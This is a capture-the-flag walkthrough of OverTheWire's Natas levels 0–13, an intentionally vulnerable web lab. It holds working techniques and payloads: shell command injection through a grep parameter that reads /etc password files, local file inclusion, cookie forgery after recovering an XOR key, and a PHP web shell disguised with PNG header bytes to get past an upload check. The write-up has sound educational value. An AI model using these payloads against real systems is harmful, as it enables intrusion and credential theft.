# Natas

## Level 00

Understand general workflow of the room. Natas war room does not use ssh like Bandit, instead it uses web pages. Each webpage's URL is provided by the instructions. The goal is to find the password to the next room.

- Because this is the first room, the password is provided with the instructions.
- Follow the instructions to find the next room's password.

### Inspecting the page

The instructions for this game are vague, it only says to look for it on the website. If the user looks at the html for the page, there is a line commented that looks like this:

```html
<!--The password for natas1 is PASSWORD_REDACTED -->
```

## Level 00 ➡ Level 01

Using the password from the last room, the user can login into the website. The instructions are the same, find the next password somewhere in the webpage.

- Inspect the page.
- Find the password.

### Force inspect element on page

The website has blocked the use of right click. In order to enter devtools the user can use the key F12. Then, the only thing left is to find the password in the html.

## Level 01 ➡ Level 02

Use credentials to login and inspect the html.

- Inspect the page.
- Find the password.

### Image manipulation

The html does not contain a comment with the password. Instead it contains an image that has a size of 1 px by 1 px.
After following the resource of the image, the user should take a look at the url:

```html
http://natas2.natas.labs.overthewire.org/files/pixel.png
```

The `files` directory can contain some extra resources other than the image. After changing the URL to view that directory, the user will find another resource, a text file. This text file contains the password for the next room.

## Level 02 ➡ Level 03

Same as always, inspect the page and find the password.

- Inspect the page.
- Find the password.

### Web crawlers

The key to this room is to pay attention to the comment left on the html:

```html
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
```

The part that talks about Google its a hint about a specific technology called web crawlers (aka web spiders or web robots).

**TLDR**: scripts or programs that systematically browse and retrieve information from the web.

There is a convention that users follow to guide this crawlers, mainly for providing information about what sites the crawlers cannot index. The convention is to provide this guidelines in a file called `robots.txt`, in the root of the page. In this particular case it will be:

```html
http://natas3.natas.labs.overthewire.org/robots.txt
```

There the user can see what parts of the website the creator don't want indexed by crawlers. Going there will give the user the password.

## Level 03 ➡ Level 04

This room forces the user into understanding basic http requests.

- Understand how the page works and what it wants the user to do.
- Understand how http requests work.
- Intercept the request and change the correct things to get the password.

### Intercept http request

This page welcomes the user with a message saying:

```text
Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```

The user has to make use of the program Burp Suite to intercept the http request and change the host.

If the user starts the interceptor and refreshes the website, the request will look like this:

```http
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
Connection: keep-alive
Referer: http://natas4.natas.labs.overthewire.org/index.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

The relevant value here is the `Referer`, if the user changes it accordingly to what the page wants, the password will appear.

## Level 04 ➡ Level 05

This time the page welcomes the user with a message that says it is not logged in.

- Inspect the website.
- Maybe intercept the request and inspect the headers.
- Find the password.

### Intercepting the request

If the user intercepts the http request, the information that it gets looks like this:

```http
GET / HTTP/1.1
Host: natas5.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L
Connection: keep-alive
Cookie: loggedin=0
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Modifying the value `loggedin` to `1` will allow the user to get the password after letting the request go.

## Level 05 ➡ Level 06

This time the user is welcomed with a form, a single textbox asking for "input secret".

- Find how the page works and what it wants the user to do.
- Inspect the code using the button presented by the page.
- Somehow get the correct input secret or bypass the check.

### Logic behind the form

After inspecting the source code, a particular part of it stands out:

```php
<?
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

What does this code do?:

- `include "includes/secret.inc";`: imports the file that defines the value of `$secret`.
- `if(array_key_exists("submit", $_POST))`: checks if the user submitted the form.
- `if($secret == $_POST['secret'])`: check if the value imported earlier matches the one taken from the form named `secret`.

### Finding the password

If the user pays attention to the previous php snippet, the correct value for the secret comes from a file called `secret.inc` in path `includes/`. Going to this location in the website:

```http
http://natas6.natas.labs.overthewire.org/includes/secret.inc
```

Gives the user a blank page. But entering the developer tools (F12) or opening the source code view (CTRL+u) shows the user the following:

```php
<?
$secret = "SECRET_REDACTED";
?>
```

Using this secret in the form will allow the user to get the password.

## Level 06 ➡ Level 07

The page gives the user two links: home and about.

- Understand what the pages wants the user to do.
- Inspect relevant information (html, source code, resources).
- Find the password.

### Inspection 06

Looking at the html, a particular comment stands out:

```html
<?--
hint: password for webuser natas8 is in /etc/natas_webpass/natas8 
-->
```

Trying out the home and about links show the user that the url changes:

```http
http://natas7.natas.labs.overthewire.org/index.php?page=home
```

Changing the value of `page=` to something different gives the user the following message:

```text
Warning: include(test): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21
```

### Getting the password for natas8

If the user remembers the comment in the html and the error message received while playing with the url, it will be no surprise that combining both things will give result in the password:

```http
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

## Level 07 ➡ Level 08

This room welcomes the user with the same form as level 05 to 06.

- Inspect all resources.
- Understand what the page wants from the user.
- Get the password.

### Inspection 07

#### Source code

Inspection via CTRL+u gives no relevant information. Neither does devtools. Inspection via the link given by the page has this relevant code snippet:

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

> **TLDR**: encodes the secret using base64, reverses it and converts it from binary to hex.

### Writing a decoder

With the logic of the encoding method, the user can easily write the inverse. Here is the python version:

```python
import base64, binascii

encoded_secret = "3d3d516343746d4d6d6c315669563362"
hex_decoded = binascii.unhexlify(encoded_secret)
reversed_str = hex_decoded[::-1]
secret = base64.b64decode(reversed_str).decode('utf-8')
print(secret)
```

Using the value given by the decoder will allow the user to get the next password.

## Level 08 ➡ Level 09

This page welcomes the user with a form: "Find words containing".

- Test the form.
- Inspect the resources.
- Get the password.

### Form 08

It appears the form returns all the words that contain the text the user typed.

- It does not work with symbols.
- It does not work with numbers.
- It changes the value `needle=` in the URL.

### Inspection 08

The devtools and source view don't have any relevant information. Using the source code viewer provided by the page gives the user the following relevant code:

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

Thoughts:

- The variable `$key` takes the value from the url, specifically from the `needle` param.
- The variable `$key` is used in a `grep` command with the *ignore case* flag.
- It looks like it takes the words from a file named `dictionary.txt`.

The file `dictionary.txt` can be inspected by:

```http
http://natas9.natas.labs.overthewire.org/dictionary.txt
```

### Research 08

- It appears the `passthru()` function in php is dangerous and normally should be disabled in `php.ini`.
- The usage of `passthru()` gives the user the chance to inject php code in the `needle=` param.

### PHP code injection 01

In a normal scenario the url looks like this:

```http
http://natas9.natas.labs.overthewire.org/?needle=example
```

To inject php code the user has to add semicolons `;` to "finish" the `grep` execution that runs on the server.

```http
http://natas9.natas.labs.overthewire.org/?needle=;ls;
```

The previous example runs `ls` on the server. The backend `grep` will end up looking like this:

```bash
grep -i ;ls; dictionary.txt
```

### Getting password for natas10

The user has to remember some information given by OverTheWire at the beginning:

> All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

With this information and the power to inject php code, the user can easily get to that location and grab the password.

```http
http://natas9.natas.labs.overthewire.org/?needle=;cat%20/etc/natas_webpass/natas10;
```

## Level 09 ➡ Level 10

The page is similar to the last one. This time it has a new message that says "*For security reasons, we now filter on certain characters*".

- Test the form.
- Inspect resources.
- Try injecting php code.
- Get the password.

### Inspection 09

The relevant information once again is given by the source viewer provided by the page:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Thoughts:

- It looks like now it checks for presence of semicolon and symbols used for code injection.
- Even though it checks for symbols, it's still using `passthru()`.

### PHP code injection 02

After some failed attempts, turns out the regex is unavoidable. So user will have to work with the fact that `$key` will reach the `grep` as a regular string.

User can research about `grep`, tldr: it can accept multiple files as haystack.

```bash
grep -i NEEDLE HAYSTACK1 HAYSTACK2
```

With this information, the new strategy is now to use `grep` to user's benefit. User knows that no matter what one of the files that `grep` is going to use as haystack is `dictionary.txt`, the other haystack could be the file that contains the password for natas11:

```bash
grep -i SOMETHING /etc/natas_webpass/natas11 dictionary.txt
```

The last thing to do is to put some character that will match with the password, this is trial and error.

```bash
grep -i a /etc/natas_webpass/natas11 dictionary.txt
```

If it matches the user will see in the output the password, plus the matches from `dictionary.txt`.

## Level 10 ➡ Level 11

This page welcomes the user with a message saying that cookies are protected with XOR encryption and a form that wants a color in hex code.

- Test form.
- Inspect resources.
- Understand the meaning of the message.
- Get the password.

### Testing form 10

It looks like the relevant information is the only cookie being stored. Here are some tests:

|  Color  |                           Cookie                           |
| :-----: | :--------------------------------------------------------: |
| #ffffff | HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D |
| #111111 | HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GdWZeVHVmTRg%3D |
| #AAAAAA | HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GBRYuJAUWTRg%3D |
| #D1AB59 | HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GAGYuJ3FuTRg%3D |

The majority of the cookie stays the same, it looks like the color only affects this part:

```text
HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1G[_-_-_-]TRg%3D
```

### Inspection 10

This time the php code available in the view source link provided has a fair amount of lines. The logic can be divided into the following actions:

```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
$data = loadData($defaultdata);
saveData($data);

if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
```

#### Loading the data

The loading of the data takes place in the following function:

```php
function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}
```

**TLDR**:

1. There has to be a cookie named `data`.
2. It takes the value of the cookie, decodes it with base64, encrypts it with `xor_encrypt()` and decodes it with json.
3. If the result of the previous step is an array with keys `bgcolor` and `showpassword`, checks if the color is valid. If it is, then sets the real values of `bgcolor` and `showpassword` into those.

#### xor encryption

Here is the definition:

```php
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
```

#### Saving the data

The saving of the data follows this logic:

```php
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```

### Cracking the encryption

#### Getting the key

The first thing to achieve is getting the value of the key. To do this, user should first focus on this particular line of code from the `saveDate()` function:

```php
base64_encode(xor_encrypt(json_encode($d)))
```

User can separate the whole process into two sides that will eventually converge. See it like this:

```text
Cookie ==> base64_encode ==> xor_encrypt <== json_encode <== array(...)
```

Lets put an example. Consider the following scenario:

```php
$cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg="
$arr = array("showpassword"=>"no","bgcolor"=>"#ffffff");
```

After applying the corresponding transformation for each one:

```php
$json_encode = '{"showpassword":"no","bgcolor":"#ffffff"}';
$base64_decode = "something non human readable";
```

Here the user has to stop and think about the xor operation. Following this example, making XOR between `{` and `$key[0]` will result in `s`:

- `'"' ^ $key[1] = 'o'`
- `'s' ^ $key[2] = 'm'`
- And so on.

Considering that the XOR transformation applied twice returns the original (in other words, the opposite of the operation is just applying it again). User can algebraically manipulate the previous operation into getting the value of a particular index of `$key`. Like this:

- `$key[0] = '{' ^ 's'`
- `$key[1] = '"' ^ 'o'`

With this information, user can create a quick PHP script that cracks the key:

```php
<?php

$cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=";
$arr = array("showpassword"=>"no","bgcolor"=>"#ffffff");

$json_encode = json_encode($arr);
$base64_decode = base64_decode($cookie);

for ($i = 0; $i < strlen($json_encode); $i++) {
    echo $json_encode[$i] ^ $base64_decode[$i];
}
```

The output will be:

```text
eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe
```

Considering the repetitions, the key should be `eDWo`. A quick way to check it:

```php
function testKey(): bool {
    $cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=";
    $arr = array("showpassword"=>"no","bgcolor"=>"#ffffff");
    $json_encode = json_encode($arr);
    $base64_decode = base64_decode($cookie);

    return xor_encrypt($base64_decode) === $json_encode; // <==
}

function xor_encrypt($in) {
    $key = 'eDWo'; // <==
    $text = $in;
    $outText = '';

    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

var_dump(testKey());
```

### Getting the correct cookie

With the key, the user can now easily traverse the `loadData()` process backwards in order to get the correct cookie.

1. Creating the array that will end up showing the password.
2. Encode with json.
3. Encrypt with XOR.
4. Encode with base64.

```php
$arr = array("showpassword"=>"yes","bgcolor"=>"#ffffff");
$json = json_encode($arr);
$xor = xor_encrypt($json);
$cookie = base64_encode($xor);

echo $cookie;
```

With the cookie the user can make use of it either with Burp Suite or with devtools and grab the password.

## Level 11 ➡ Level 12

This time the user is welcomed with the instructions of uploading a `.jpeg` of up to 1KB. The page provides two buttons: one for browsing the filesystem and other for uploading the file.

- Test the uploader.
- Inspect the resources.
- Find what needs to be done.
- Get the password.

### Testing the uploader 11

- Not uploading anything shows an error.
- Uploading any file changes its name and forces its extension to `.jpg`.
- The uploaded file can be seen following the provided link. The resource is at `/upload/new_name.jpg`.

### Inspection 11

#### HTML inspection 11

The html inspection shows two odd lines with `type="hidden`:

```html
<input type="hidden" name="MAX_FILE_SIZE" value="1000">
<input type="hidden" name="filename" value="8cu5lximjb.jpg">
```

The `.jpg` changes each time the user refreshes the page.

#### PHP inspection 11

The PHP inspection shows, as usual, a fair amount of functions. The flow of execution looks something like:

1. Checks if superglobal `$_POST` contains the key `filename`.
2. If does not contain that key, it randomly generates a filename with extension `.jpg` as seen previously.
3. If it contains that key, randomly generates a path using multiple functions. It ends up looking like `upload/random_string.filename_ext`.
4. If file isn't too big and passes `move_uploaded_file()` the file gets uploaded.

### Random path creation logic

The path creation uses 3 functions:

#### `genRandomString`

```php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}
```

Thoughts:

- Generates a string of length 10, using lowercase letters and numbers.

#### `makeRandomPath`

```php
function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
```

Thoughts:

- Given a directory and a file extension, generates a path that follows this format: `$dir/random_string.$ext`.
- Does that until file does not exist already.

#### `makeRandomPathFromFilename`

```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
```

Thoughts:

- The file given as parameter is only used for its extension. The function `pathinfo` with the option `PATHINFO_EXTENSION` ignores everything except the extension.
- Returns a path that follows this format: `$dir/random_string.$ext`.

### Resolution 11

Taking into consideration that no matter what file the user uploads it always ends up being a `.jpg`, and remembering that the only place this is defined is in the html, the user can try manipulating this resource on the frontend to see what happens.

```html
<input type="hidden" name="filename" value="t2sgjbtabr.php">
```

After submitting the user gets a message that says:

> The file `upload/96omfk74zs.php` has been uploaded.

And following the link opens the file and interpretes the php code inside. With this information, the user can write the following:

```php
<?

$out = shell_exec('cat /etc/natas_webpass/natas13');
echo "<pre>$out</pre>";
```

Thoughts:

- `$out`: gets the result of running the shell command.
- `echo ...`: makes it visible on the web page.

## Level 12 ➡ Level 13

The website looks almost like the previous one, the only difference is that this time is has a message saying it only accepts image files.

- Test the uploader.
- Inspect the resources.
- Get the password.

### Testing the uploader 12

- Uploading a php file doesn't seem to work.
- Changing the file extension on the html doesn't work either.

### Inspection 12

#### HTML inspection 12

The html doesn't seem to contain relevant information. Changing the file extension there does not affect how the backend gets the file.

#### PHP inspection 12

There seems to be the same functions as previous room.

- `getRandomString()`: has the same implementation.
- `makeRandomPath($dir, $ext)`: has the same implementation.
- `makeRandomPathFromFilename($dir, $fn)`: has the same implementation.

What changes is the implementation of the `if` statement that comes before the `move_uploaded_file()`:

```php
if($err){
    if($err === 2){
        echo "The uploaded file exceeds MAX_FILE_SIZE";
    } else{
        echo "Something went wrong :/";
    }
} else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
    echo "File is too big";
} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
} else {
    // ...
}
```

This particular it in charge of blocking the user uploads if the file is not an image:

```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
}
```

After doing some research about that function, what ended up catching my attention was this:

> `exif_imagetype()` reads the first bytes of an image and checks its signature.

A possible strategy could be changing the first bytes of the `.php` file and tricking the function into considering an image.

### Resolution 12

#### More info about `exif_imagetype` and how to bypass it

Doing more research about the `exif_imagetype()` function gave me the following info:

- In order to determine if a file is an image, **it reads the first 8 bytes**.
- The logic behind the functions does not care about the file extension.
- The algorithm checks for a valid image data in addition to the headers.

Some examples of the first bytes:

| TYPE  |           BYTES           |      ASCII       |
| :---: | :-----------------------: | :--------------: |
| JPEG  |        `FF D8 FF`         |      `ÿØÿ`       |
|  PNG  | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG\r\n\x1A\n` |
|  GIF  |       `47 49 46 38`       |      `GIF8`      |

#### Masking the PHP file

Steps to follow:

1. Add image headers.
2. Add valid image data.
3. Append the php code.
4. Test it.

Final product:

```php
<?php
$valid_png_header = "\x89PNG\r\n\x1A\n"
    . "\x00\x00\x00\rIHDR"
    . "\x00\x00\x00\x01\x00\x00\x00\x01"
    . "\x08\x02\x00\x00\x00\x9C\x7F\x8D\xF3"
    . "\x00\x00\x00\x0CIDATx\xDA"
    . "\x63\x60\x60\x60\x00\x00\x00\x01"
    . "\x00\x01\x01\x00\x00\x00\x00\x00"
    . "\x00\x00\x00\x00\x00\x00\x00\x00"
    . "\x00\x00\x00\x00\x00\x00\x00\x00"
    . "\x00\x00\x00\x00\x00\x00\x00\x00"
    . "\x00\x00\x00\x00\x00\x00\x00\x00";

$php_code = "<?php\n"
    . "echo \"This is a PHP file.\";\n"
    . "?>";

$combined_content = $valid_png_header . $php_code;
file_put_contents('fakeimg.php', $combined_content);

// Verify the file type
$file_type = exif_imagetype('fakeimg.php');
if ($file_type === false) {
    echo "The file is not recognized as an image.\n";
} else {
    echo "The file is recognized as an image of type: $file_type\n";
}
?>
```

#### Testing the fake image on the website

It works:

> The file `upload/4emxs1rgq2.php` has been uploaded.

And the execution shows:

```html
�PNG  IHDR���IDATx�c```This is a PHP file.
```

#### Adding the real code

Lastly, change the php code to look for natas14's password.

```php
// ...
$php_code = "<?php\n"
    . "\$out = shell_exec(\"cat /etc/natas_webpass/natas14\");\n"
    . "echo \"<pre>\$out</pre>\";\n"
    . "?>";
// ...
```
